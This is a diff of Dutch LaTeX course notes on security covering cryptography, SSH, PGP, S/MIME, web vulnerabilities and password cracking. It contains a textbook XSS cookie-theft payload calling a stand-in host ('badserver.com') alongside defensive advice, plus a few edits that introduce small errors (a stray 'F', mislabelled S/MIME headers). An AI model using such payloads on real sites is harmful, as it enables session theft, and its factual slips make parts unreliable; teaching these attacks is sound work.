@@ -114,7 +114,7 @@
 	Stel nu \textbf{P(N, k)) = 0.99}, dan is \textbf{k $\approx$ 4,6} en \textbf{$\sqrt{N} \approx 4,6 \cdot 2^{n/2}$}.
 	\item \textbf{Message Authentication Code}
 
-	Een \textbf{Message Authentication Code (MAC)} kan net zoals een hash gebruikt worden om informatie te encrypteren. De input van deze functie is echter een combinatie van plaintext en een private sleutel. Het biedt ook bijkomende functionaliteit:
+	Een \textbf{Message Authentication Code (MAC)} is gelijkaardig aan een hashfunctie. De input van deze functie is echter een combinatie van plaintext en een private sleutel. Het biedt ook bijkomende functionaliteit:
 	\begin{itemize}
 		\item Controle of een bericht aangepast wordt.
 		\item Controle of dat de verzender correct is
@@ -181,7 +181,7 @@
 	\chapter{Netwerk en communicatiebeveiliging}
 	Voorlopig hebben we enkel de basisconcepten gezien zoals: symmetrische encryptie, asymmetrische encryptie, hashfuncties en message authentication codes. Dit hoofdstuk zal deze concepten toepassen om beveiligingsprotocollen te ontwikkelen voor netwerken.
 	\section{SSH}
-	SSH (Secure Shell) is een \textbf{applicatielaagprotocol}. Ondanks deze naamgeving bevat SSH ook een \textbf{transportlaagprotocol}, met als bedoeling een veilige connectie te maken tussen andere OSI applicatielaagprotocollen (bv HTTP) en de werkelijke OSI transportlaag. SSH can draaien op zowel workstations als routers en switches. Routers en switches volgen de OSI laag namelijk niet strict, zodat zij ook een applicatielaag hebben. Vroeger werd het programma \textbf{telnet} gebruikt om remote configuratie toe te passen. Deze manier van werken is \textbf{onveilig} aangezien verkeer tussen de local host en remote host niet geëncrypteerd wordt, zodat deze door eender wie kunnen bekeken worden. SSH verhelpt dit probleem door de informatie te encrypteren. Vrijwel alle UNIX en Linux distributies komen met een versie van SSH geinstalleerd. SSH laat onder andere toe om:
+	SSH (Secure Shell) is een \textbf{applicatielaagprotocol}. Ondanks deze naamgeving bevat SSH ook een \textbf{transportlaagprotocol}, met als bedoeling een veilige connectie te maken tussen andere OSI applicatielaagprotocollen (bv HTTP) over TCP. SSH can draaien op zowel workstations als routers en switches. Routers en switches volgen de OSI laag namelijk niet strict, zodat zij ook een applicatielaag hebben. Vroeger werd het programma \textbf{telnet} gebruikt om remote configuratie toe te passen. Deze manier van werken is \textbf{onveilig} aangezien verkeer tussen de local host en remote host niet geëncrypteerd wordt, zodat deze door eender wie kunnen bekeken worden. SSH verhelpt dit probleem door de informatie te encrypteren. Vrijwel alle UNIX en Linux distributies komen met een versie van SSH geinstalleerd. SSH laat onder andere toe om:
 	\begin{itemize}
 		\item een veilige remote verbinding op te zetten vanuit eender welke local host naar eender welke remote host. Het protocol maakt gebruik van erkende algoritme voor zowel encryptie (sleutels van ten minste 128 bits), data-integriteit, sleuteluitwisselingen en public key management. Tijdens het leggen van een connectie worden algoritmen tussen de local host en remote host afgesproken, op basis van welke ze al dan niet ondersteunen,
 		\item TCP te tunnelen via een SSH connectie,
@@ -1041,7 +1041,7 @@
 	\label{fig:DES}
 \end{figure}
 
-	Het \textbf{DES (Data Encryption Standard)} algoritme maakt gebruik van het reeds vermelde Feistel schema waarbij de \textbf{blokgrootte 64 bits} en \textbf{sleutelgrootte 56 bits} bedraagt. Deze methode is redelijk traag, ondanks de kleine blokgrootte, en wordt door de kleine sleutelgrootte ook als onveilig beschouwd. Een 56 bit sleutel kan namelijk binnen de 10 uur gekraakt worden indien het aantal operatiers per \textbf{micro}seconde $10^6$ bedraagt. 
+	Het \textbf{DES (Data Encryption Standard)} algoritme maakt gebruik van het reeds vermelde Feistel schema waarbij de \textbf{blokgrootte 64 bits} en \textbf{sleutelgrootte 56 bits} bedraagt. Deze methode is redelijk traag, ondanks de kleine blokgrootte, en wordt door de kleine sleutelgrootte ook als onveilig beschouwd. Een 56 bit sleutel kan namelijk binnen de 10 uur gekraakt worden indien het aantal operaties per \textbf{micro}seconde $10^6$ bedraagt. 
 	
 	Het algoritme maakt gebruik van 16 ronden in het Feistel schema. De 56 bit sleutel wordt gebruikt om iteratiesleutels $K_1, K_2, ... K_{16}$ te bepalen, die elk 48 bits groot zijn. Voor de eerste ronde en na de laatste ronde wordt er een extra permutatie uitgevoerd, waarbij de laatste permutatie het inverse is van de eerste permutatie. Het resultaat van dit algoritme is één van de $2^{64}$ uitvoermogelijkheden van de 64 bits. 
 
@@ -1075,7 +1075,7 @@
 		\item \textbf{CTR (Counter)}
 	\end{itemize}
 	\subsubsection{3-DES}
-	Omdat de opgelegde sleutelgrootte van \textbf{56 bits} voor DES onvoldoende is, gaan we DES drie maal na elkaar uit te voeren. De sleutelgrootte bedraagt nu \textbf{168 bits}. Dit is natuurlijk nog trager dan DES, wat al behoorlijk traag is. De sleutel van 168 bits wordt nu opgedeeld in 3 sleutels van elk 56 bits, $K_1, K_2$ en $K_3$. De plaintext wordt eerst in geëncrypteerd met DES en sleutel $K_1$, de ciphertext hiervan wordt gedecrypteerd met DES en sleutel $K_2$, de plaintext hiervan wordt terug geëncrypteerd maar met sleutel $K_3$. 3DES is nog altijd nutteloos, en wordt aangezien als een zwak encryptiealgoritme. 
+	Omdat de opgelegde sleutelgrootte van \textbf{56 bits} voor DES onvoldoende is, gaan we DES drie maal na elkaar uit te voeren. De sleutelgrootte bedraagt nu \textbf{168 bits}. Dit is natuurlijk nog trager dan DES, wat al behoorlijk traag is. De sleutel van 168 bits wordt nu opgedeeld in 3 sleutels van elk 56 bits, $K_1, K_2$ en $K_3$. De plaintext wordt eerst geëncrypteerd met DES en sleutel $K_1$, de ciphertext hiervan wordt gedecrypteerd met DES en sleutel $K_2$, de plaintext hiervan wordt terug geëncrypteerd maar met sleutel $K_3$. 3DES is nog altijd nutteloos, en wordt aangezien als een zwak encryptiealgoritme. 
 	\subsection{AES}
 	\todo{no clue what w[x, y] wil zeggen + DECRYPTIE (SLIDE 96)}
 	\begin{figure}[ht]
@@ -1206,17 +1206,17 @@
 
 	\underline{Om authenticate te garanderen}, moet de \textbf{verzender} volgende acties ondernemen:
 	\begin{itemize}
-		\item[\info] Genereer een hashwaarde van het bericht.
+		\item[\info] Genereer een hashwaarde van het bericht (de sleutel van het bericht).
 		\item[\info] Encrypteer deze hashwaarde met een asymmetrisch encryptiealgoritme met de private sleutel van de verzender.
 		\item[\info] Optioneel kan dit bericht nog gecompresseerd worden en omgevormd worden tot een radix-64 formaat.
 	\end{itemize}
-	De verzender stuurt nu het plaintext bericht, samen met de geëncrypteerde sleutel naar ontvanger. De \textbf{ontvanger} van dit bericht onderneemt dan volgende stappen:
+	De verzender stuurt nu het plaintext bericht, samen met de geëncrypteerde sleutel naar de ontvanger. De \textbf{ontvanger} van dit bericht onderneemt dan volgende stappen:
 	\begin{itemize}
 		\item[\info] De optionele conversie van radix-64 en de compressie uitvoeren.
 		\item[\info] De hashwaarde moet gedecrypteerd worden met de publieke sleutel van de verzender.
 		\item[\info] De verzender berekend nu ook de hashwaarde van het bericht, en vergelijk dit met de gedecrypteerde hash. 
 	\end{itemize}
-	Als de hashes gelijk zijn, dan is het bericht geauthenticeerd. Zijn de hashes niet gelijk, dan werd het bericht niet geëncrypteerd door de verzender die verwacgt wordt.
+	Als de hashes gelijk zijn, dan is het bericht geauthenticeerd. Zijn de hashes niet gelijk, dan werd het bericht niet geëncrypteerd door de verzender die verwacht wordt.
 
 	\underline{Om confidentialiteit te garanderen}, moet de \textbf{verzender} volgende acties ondernemen:
 	\begin{itemize}
@@ -1249,10 +1249,10 @@
 			\item Een identificatie van de gebruiker.
 		\end{itemize}
 
-		Bij het aanmaken van een private sleutel wordt er gebruik gemaakt van een paszin. Op basis van deze paszin wordt er een tijdelijke sleutel aangemaakt die gebruikt zal worden van deze encryptie. Om zo een private sleutel te decrypteren, moet deze paszin opnieuw ingegeven worden, zodat dezelfde tijdelijke sleutel kan gegenereerd worden.
+		Bij het aanmaken van een private sleutel wordt er gebruik gemaakt van een paszin. Op basis van deze paszin wordt er een tijdelijke sleutel aangemaakt die gebruikt zal worden voor deze encryptie. Om zo een private sleutel te decrypteren, moet deze paszin opnieuw ingegeven worden, zodat dezelfde tijdelijke sleutel kan gegenereerd worden.
 
 		\item[\info] \textbf{Publieke sleutelhanger}: Deze houdt volgende informatie bij per sleutel:
-		\begin{itemize}
+		\begin{itemize}F
 			\item De 64 bit identificatie.
 			\item De publieke sleutel
 			\item Een identificatie van de gebruiker.
@@ -1288,7 +1288,7 @@
 		\item[\alert] Sommige servers converteren de berichten (tabs naar spaties, CR LF naar LF, whitespace verwijderen, ...)
 	\end{itemize}
 
-	\textbf{MIME} definieert \underline{vijf nieuwe headers}:
+	\textbf{S/MIME} definieert \underline{vijf nieuwe headers}:
 	\begin{itemize}
 		\item[\info] \texttt{MIME-VERSION}
 		\item[\info] \texttt{CONTENT-TYPE}: beschrijving van de structuur van de inhoud, zodat de ontvanger de juiste conversiemethode kan kiezen. Een aantal voorbeelden zijn: \begin{itemize}
@@ -1342,7 +1342,7 @@
 		\item[\info] \textbf{Client-side}: De client-side vertrouwen is een slechte zaak. Het is eenvoudig om met javascript manipulaties uit te voeren. Controleer elke actie op de server-side.
 		\item[\info] \textbf{Direct object reference}: De applicatie bevat resources die enkel mogen gezien worden voor een geautoriseerde gebruiker, maar iedereen kan eigenlijk gewoon de URL intypen.
 		\item[\info] \textbf{Authenticatiefouten}: Het gebruik van zwakke paswoorden, die gekraakt kunnen worden met een brute-force methode. Ook als een gebruiker een fout paswoord, maar wel een juist username intypt, moet de applicatie toch tonen dat het ofwel een fout paswoord of fout usernaam is.
-		\item[\info] \textbf{Cross-site scripting (XSS)}: XSS werkt goed bij zwakke webservers. Een aanvaller kan code injecteren, zodat normale gebruikers die code zullen uitvoeren wanneer ze de zwakke webserver bezoeken. \underline{X voorbeelden:}
+		\item[\info] \textbf{Cross-site scripting (XSS)}: XSS werkt goed bij zwakke webservers. Een aanvaller kan code injecteren, zodat normale gebruikers die code zullen uitvoeren wanneer ze de zwakke webserver bezoeken. \underline{2 voorbeelden:}
 		\begin{enumerate}
 			\item Een webserver laat toe om queries in te geven. Gebruikers kunnen inloggen met hun username en paswoord. Er wordt een cookie bijgehouden die de sessie bijhoudt. Bij een foute query, zoals 
 			$$\texttt{http://web.org?q=puppies}$$ zal de webserver een foutmelding geven:
@@ -1354,7 +1354,6 @@
 			De aanvaller weet nu dat hij een XSS aanval kan uitvoeren. De query valideert de input namelijk niet, zodat er eender wat kan staan. De aanvaller construeert een URL, waarbij de query een script is dat de cookies van de ingelogde gebruiker ophaalt en doorstuurt naar de aanvaller zijn server, zoals:
 			$$\texttt{http://web.org?q=<script src="http://badserver.com/script.js"></script>}$$
 			De aanvaller verstuurt deze (gemaskeerde) URL naar gebruikers. Elke gebruiker die daar nu op klikt, zal dat script uitvoeren op zijn browser. Als de administrator van de webserver op deze link klikt, krijgt de aanvaller toegang tot dit adminaccount.
-
 			\begin{itemize}
 				\item[\info] De server kan dit voorkomen door input te valideren, ongeldige queries te redirecten, meerdere logins op hetzelfde accounts invalideren.
 				\item[\info] De client kan dit enkel voorkomen door op de hoogte te zijn van zulke aanvallen, en niet op vreemde links te klikken van onbekenden.
@@ -1363,7 +1362,6 @@
 			\begin{itemize}
 				\item[\info] Het forum moet, als het HTML tags toelaat, de script tags uit de reactie halen.
 			\end{itemize}
-			\item 
 		\end{enumerate}
 
 		XSS kan onder andere gebruikt worden voor: cookie stealing, website redirection, phishing, privacy violation, javascript malware, ...
@@ -1410,10 +1408,26 @@
 		\item[\info] \textbf{Dictionary attack:} Deze methode maakt gebruik van een voorgedefinieerde lijst van vaak gebruikte paswoorden. Er kan een trade-off gemaakt worden tussen het gebruik van berekende hashes voor die paswoorden en de tijd die men daarin wil steken. Varianten van deze aanval zal de lijst uitbreiden met kleine wijzigingen voor elk paswoord.
 		\item[\info] \textbf{Hash chaining:} Een hash chain is een opeenvolging van hash- en reductiefuncties:
 		$$aaaaaa \rightarrow_{\substack{H}} 281DAZF40 \rightarrow_{\substack{R}}  sgfnyd \rightarrow_{\substack{H}}  920ECF10 \rightarrow_{\substack{R}}  kiebgt$$
-		Enkel het eerste en het laatste paswoord worden opgeslaan, als een paar $aaaaaa \rightarrow kiebgt$. Stel nu dat we een hash $920ECF10$ hebben, als we hier de reductiefunctie op loslaten krijgen we $kiebgt$.  In onze tabel zoeken we op of er een bepaalde hash chain eindigt op $kiebgt$, in dit geval start deze chain met $aaaaaa$. We voeren dezelfde bewerking uit en zo zal blijken dat het paswoord $sgfnyd$ is. In praktijk wordt er een lijst bijgehouden van vaak gebruike paswoorden samen met hun hash chain. De reductiefunctie kiezen is moeilijk, omdat ze moet resulteren in waarschijnlijke paswoorden. Een ander nadeel is dat erveel valse alarmen zijn. Dit wil zeggen dat een andere chain dezelfde hash uitkomt. \todo{slide16}
+		Enkel het eerste en het laatste paswoord worden opgeslaan, als een paar $aaaaaa \rightarrow kiebgt$. Stel nu dat we een hash $920ECF10$ hebben, als we hier de reductiefunctie op loslaten krijgen we $kiebgt$.  In onze tabel zoeken we op of er een bepaalde hash chain eindigt op $kiebgt$, in dit geval start deze chain met $aaaaaa$. We voeren dezelfde bewerking uit en zo zal blijken dat het paswoord $sgfnyd$ is. In praktijk wordt er een lijst bijgehouden van vaak gebruike paswoorden samen met hun hash chain. De reductiefunctie kiezen is moeilijk, omdat ze moet resulteren in waarschijnlijke paswoorden. Een ander nadeel is dat erveel valse alarmen zijn. Dit wil zeggen dat een andere chain dezelfde hash uitkomt. 
+		\item[\info] \textbf{Rainbow tables:} Deze vorm voorkomt collisies door bij elke iteratie een andere reductiefunctie te gebruiken. Op die manier kan er enkel nog een collisie voorkomen als twee chains op dezelfde iteratie dezelfde waarde uitkomen.
+	\end{itemize}
+	Het is natuurlijk mogelijk om zich te \underline{beveiliging} tegen dit soort aanvallen: het aantal loginpogingen kunnen in eerste instantie beperkt worden. Het gebruik van tragere en complexe hashfuncties zoals bycrpt wordt ook aangeraden. Men voegt vaak ook een \emph{salt} toe: een vast aantal bits waarvan de waarde bepaald wordt bij de creatie van het paswoord. De combinatie van deze salt en het paswoord wordt via een one-way functie geëncodeerd. Dit resultaat wordt dan gehasht.
+
+	Het paswoordmechanisme van \textbf{Linux:}
+	\begin{itemize}
+		\item[\info] Linux maakte \underline{vroeger} gebruik van een paswoordbestand, \texttt{/etc/passwd} waarin per regel een user Id, de plaintext salt (12 bits) en de combinatie van de salt en het paswoord. Het encoderen gebeurd met \texttt{crypt(3)}, wat een gewijzigde versie is van DES. De resulterende 64 bits wordt omgevormd naar 11 ASCII karakters. 
+		\item[\alert] Het paswoordbestand is leesbaar voor de root gebruiker, alle groepen en alle gebruikers. Het enkel leesbaar maken voor root heeft als gevolg dat gebruikers zich niet meer kunnen inloggen. 
+		\item[\info] De shadow-utils lossen dit probleem op. De paswoorden worden nu geplaatst in \texttt{/etc/shadow}, die enkel toegankelijk is voor root.
 	\end{itemize}
 	\subsubsection{Biometrieken}
+	Mogelijkheden:
+	\begin{itemize}
+		\item[\info] \textbf{Vingerafdrukken:} Deze zijn zogenaamd uniek voor elke persoon. Nadelig is dat het niet geheim is en dat het eenvoudig kan 'gekopieërd worden'. Eens dat een vingerafdruk bekend is, kan deze vingerafdruk nooit meer opnieuw gebruikt worden om te authenticeren, aangezien dit te risicovol is. 
+		\item[\info] \textbf{Iris:} De iris van een person is ook uniek en blijft onveranderd in de tijd.
+		\item[\info] \textbf{Retina:} Ook de retina bevat een uniek patroon, maar kan gewijzigd worden door oogaandoeningen.
+	\end{itemize}
 	\subsubsection{Security tokens}
+	Een security token is een \underline{fysiek} object die sleutelparen bijhoudt. Malware heeft haast geen toegang tot deze devices. Vaak wordt het gebruikt bij two-factor authentication. Een gebruiker geeft eerst zijn email+paswoord combinatie in, en wordt dan gevraagd om een bepaalde PIN-code in te geven die op de security token verschijnt. Deze tokens zijn verantwoordelijk voor het encrypteren en decrypteren van de berichten die het toekrijgt en verstuurd. 
 	\subsection{Vertrouwd besturingssysteem}
 
 	\begin{table}[ht]
